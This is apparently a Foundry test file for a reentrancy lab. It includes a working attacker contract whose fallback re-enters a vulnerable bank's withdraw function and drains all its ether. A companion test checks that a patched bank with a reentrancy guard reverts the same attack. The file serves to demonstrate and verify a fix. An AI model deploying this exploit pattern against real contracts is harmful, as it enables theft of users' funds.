// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/reentrancy/VulnerableBank.sol";
import "../src/reentrancy/PatchedBank.sol";

contract ReentrancyAttacker {
    VulnerableBank public bank;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Need 1 ETH to attack");
        bank.deposit{value: ATTACK_AMOUNT}();
        bank.withdraw();
    }

    // Fallback reenters withdraw() while bank's balances[address(this)] is still > 0
    receive() external payable {
        if (address(bank).balance >= ATTACK_AMOUNT) {
            bank.withdraw();
        }
    }
}

contract ReentrancyTest is Test {
    VulnerableBank public vulnerableBank;
    PatchedBank public patchedBank;
    ReentrancyAttacker public attackerContract;

    address public victim = address(0x1111);
    address public attacker = address(0x9999);

    function setUp() public {
        vulnerableBank = new VulnerableBank();
        patchedBank = new PatchedBank();

        // Victim deposits 10 ETH into VulnerableBank
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vulnerableBank.deposit{value: 10 ether}();

        // Victim deposits 10 ETH into PatchedBank
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        patchedBank.deposit{value: 10 ether}();

        // Setup attacker
        vm.deal(attacker, 2 ether);
    }

    function testExploitReentrancy() public {
        vm.startPrank(attacker);
        attackerContract = new ReentrancyAttacker(address(vulnerableBank));

        emit log_named_uint("Bank Balance Before Exploit", address(vulnerableBank).balance);
        emit log_named_uint("Attacker Contract Balance Before", address(attackerContract).balance);

        // Execute reentrancy exploit
        attackerContract.attack{value: 1 ether}();

        emit log_named_uint("Bank Balance After Exploit", address(vulnerableBank).balance);
        emit log_named_uint("Attacker Contract Balance After", address(attackerContract).balance);

        // Bank was drained of all 10 ETH + 1 ETH returned
        assertEq(address(vulnerableBank).balance, 0, "Bank should be completely drained");
        assertEq(address(attackerContract).balance, 11 ether, "Attacker should have stolen all funds");
        vm.stopPrank();
    }

    function testPatchedBankPreventsReentrancy() public {
        vm.startPrank(attacker);
        // Attempting to reenter PatchedBank will revert via ReentrancyGuard
        // We deploy an attacker pointing to patched bank
        ReentrancyAttacker patchedAttacker = new ReentrancyAttacker(address(patchedBank));

        vm.expectRevert();
        patchedAttacker.attack{value: 1 ether}();

        // Ensure patched bank funds are completely intact
        assertEq(address(patchedBank).balance, 10 ether, "Patched bank funds must remain untouched");
        vm.stopPrank();
    }
}
